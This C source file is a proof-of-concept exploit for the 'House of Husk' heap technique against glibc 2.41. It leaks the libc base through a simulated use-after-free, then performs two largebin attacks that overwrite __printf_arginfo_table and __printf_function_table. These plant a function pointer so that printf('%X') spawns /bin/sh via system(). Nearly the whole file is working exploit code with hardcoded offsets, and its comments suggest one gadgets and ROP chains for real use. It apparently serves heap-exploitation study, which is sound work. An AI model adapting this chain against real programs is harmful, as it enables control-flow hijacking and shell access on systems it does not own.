/*
 * Title   : House of Husk PoC via Largebin Attack for modern Versions of GLibc 
 * Author  : Axura
 * Target  : glibc 2.41 on Arch Linux
 * Purpose : Attack chain 2 (hijack of __printf_function_table via Largebin Attack)
 * Website :
 *
 *     this PoC uses a backdoor() function for reliable exploitation flow.
 *   - A real-world payload may involve stack frame manipulation (for one gadget), ROP, ORW, or constraint-satisfying gadgets.
 * 
 * Compile : gcc -no-pie -fno-PIE -O0 -g -o house_of_husk_2_glibc-2.41 house_of_husk_2_glibc-2.41.c
 */

#include <assert.h>
#include <complex.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>

/* Change the offsets if testing different GLibc verisons */
#define MAIN_ARENA         0x1d9ca0
#define MAIN_ARENA_DELTA   0x60
#define PRINTF_ARGINFO_T   0x1db908
#define PRINTF_FUNCTION_T  0x1db900

void backdoor()
{
	printf("[!] We can replace this backdoor with one gadget, \n\twhich requires a \"stack wash\" to fulfill the constraints in real exploit\n");
	printf("\tOr use ROP, ORW chain to execute commands\n");
	system("/bin/sh");
}

int main(void)
{
	/*Disable IO buffering to prevent stream from interfering with heap*/
	setvbuf(stdin,NULL,_IONBF,0);
	setvbuf(stdout,NULL,_IONBF,0);
	setvbuf(stderr,NULL,_IONBF,0);

	printf("===================== Heap fengshui ====================\n"); 

	size_t *p1 = malloc(0x428);
	printf("For the 1st Largebin Attack, we allocate a large 0x%lx chunk [p1] (%p)\n", p1[-1], p1-2);
	printf(" Note: [p1] refers to the chunk itself; 'p1' points to its user data region, not the metadata\n");
	printf(" We will use this same convention for the following demonstratation\n");
	size_t *g1 = malloc(0x18);  // Guard chunk

	printf("\n");

	size_t *p2 = malloc(0x418);
	printf("We also allocate a second large 0x%lx chunk [p2] (%p).\n", p2[-1], p2-2);
	printf("This chunk should be smaller than [p1] and belong to the same large bin.\n");
	size_t *g2 = malloc(0x18);   // Guard chunk

	printf("\n");

	printf("Additionally, we will allocate two more chunks for the 2nd Largebin Attack\n");
	printf("And put them into a different large bin\n");
	size_t *p3 = malloc(0x488);
	printf("The larger one is the 0x%lx [p3] (%p)\n", p3[-1], p3-2);
	size_t *g3 = malloc(0x18);  // Guard chunk
	size_t *p4 = malloc(0x478);
	printf("The smaller one is the 0x%lx [p4] (%p)\n", p4[-1], p4-2);
	size_t *g4 = malloc(0x18);  // Guard chunk

	printf("\n");

	printf("Chunks for 1st Largebin Attack:\n");
	printf("[p1]: 0x%lx @ %p\n", p1[-1], p1-2);
	printf("[p2]: 0x%lx @ %p\n\n", p2[-1], p2-2);
	printf("Chunks for 2nd Largebin Attack:\n");
	printf("[p3]: 0x%lx @ %p\n", p3[-1], p3-2);
	printf("[p4]: 0x%lx @ %p\n\n", p4[-1], p4-2);

	printf("======================= Leak libc ======================\n"); 

	free(p1);
	printf("Free the larger one of the 1st pair --> [p1] (0x%lx, @ %p)\n", p1[-1], p1-2);

	unsigned long libc_base;
	printf("Now [p1] is in unsorted bin, we can simulate a UAF to leak libc.\n");
	libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;
	printf("[+] libc base: 0x%lx\n", libc_base);
	printf("[+] target __printf_function_table: %p\n", (void *)(libc_base + PRINTF_FUNCTION_T));
	printf("[+] target __printf_arginfo_table:  %p\n", (void *)(libc_base + PRINTF_ARGINFO_T));

	printf("\n");

	printf("==================== Largebin Attack 1 ===================\n"); 

	printf("Now we start the 1st Largebin Attack, with [p1] and [p2]\n");
	printf("Our goal is to write a heap address into __printf_arginfo_table\n");
	printf("(This is opposite to Attack Chain 1, where we hijack __printf_arginfo_table in the 1st Largebin Attack)\n");

	printf("\n");

	size_t *g5 = malloc(0x438);
	printf("Allocate a chunk larger than [p1] to insert [p1] into large bin\n");

	printf("\n");

	free(p2);
	printf("Free the smaller one now --> [p2] (0x%lx, @ %p)\n", p2[-1], p2-2);
	printf("Now [p2] is inserted into unsorted bin, while p[1] is in large bin"); 

	printf("\n");

	p1[3] = (size_t)(libc_base + PRINTF_ARGINFO_T- 0x20);
	printf("Hijacking [p1]->bk_nextsize → (__printf_arginfo_table - 0x20)\n");
	printf("This sets up a Largebin Attack where inserting [p2] will overwrite the function table pointer\n");
	printf("                   (largebin Attack: https://4xura.com/pwn/heap/large-bin-attack)\n");

	printf("\n");

	size_t *g6 = malloc(0x438);
	printf("Allocate another chunk larger than [p2] to place [p2] into large bin\n");
	printf("This triggers Largebin Attack to write the chunk address of [p2] into __printf_arginfo_table\n");

	printf("\n");

	assert((size_t)(p2-2) == *(size_t *)(libc_base+PRINTF_ARGINFO_T));

	printf("Remeber we CANNOT run printf() with fmt specifiers after hijacking __printf_function_table in Attack Chain 1?\n");
	printf("We won't have that issue by hijacking __printf_arginfo_table at 1st palce here!\n");

	printf("\n");

	printf("==================== Largebin Attack 2 ===================\n"); 

	printf("Now we start the 2nd Largebin Attack, with [p3] and [p4]\n");
	printf("Our goal is to write our controlled fake chunk address into __printf_function_table\n");
	printf("To fake a table where __parse_one_specmb (called by printf()) uses to parse format string specifiers\n");

	printf("\n");

	printf("Therefore, we need to hijack this __printf_function_table and the function pointers it holds\n");
	printf("We will deploy an evil function pointer (e.g. backdoor, one gadget, ROP, ORW, etc.) at the offset for a chosen fmt specifier\n");

	printf("\n");

	printf("[!] Choosing the format specifier 'X' for hijack\n");
	puts("When printf(\"\%X\", ...) is called, our fake handler at the corresponding offset will be invoked");

	printf("\n");

	printf("Writing function pointer to backdoor() on fake chunk [p4] at offset ord('X'*8)...\n");
	printf("Namely at offset ord('X-2')*8 from user-input field of the chunk\n");

	printf("\n");

	printf("[*] If there's no backdoor, we can use one gadget or ORW instead - this is for the sake of demonstratation\n");
	size_t backdoor_addr = (size_t)&backdoor;
	*(size_t *)(p4 + ('X' - 2)) = backdoor_addr;

	printf("\n");

	printf("[+] Planted backdoor() address to corresponding offset on fake table [p4]\n");

	printf("\n");

	printf("After preparing the fake chunk [p4]\n");
	printf("We just repeat the Largebin Attack, same as before, but on __printf_function_table\n");
	printf("So we will skip the details.\n");
	
	printf("\n");

	free(p3);
	size_t *g7 = malloc(0x498);
	printf("The larger 0x491 [p3] is now freed into large bin\n");
	free(p4);
	printf("The smaller 0x481 [p4] is now freed into unsorted bin\n");

	printf("\n");

	p3[3] = (size_t)(libc_base + PRINTF_FUNCTION_T- 0x20);
	printf("Hijacking [p3]->bk_nextsize → (__printf_function_table - 0x20)\n");
	printf("This prepares the second Largebin Attack to redirect format specifier parsing\n");
	printf("                   (largebin Attack: https://4xura.com/pwn/heap/large-bin-attack)\n");

	printf("\n");

	size_t *g8 = malloc(0x498);
	printf("This triggers the Largebin Attack to write the [p4] chunk address into __printf_function_table\n");

	assert((size_t)(p4-2) == *(size_t *)(libc_base+PRINTF_FUNCTION_T));

	printf("\n");

	puts("[*] Setup complete. Press ENTER to trigger...");
	puts("[*] Setup complete for House of Husk (Attack Chain 2) in glibc-2.41");
	getchar();
	printf("%X", 0);  // Triggers backdoor if successful

	return 0;
}

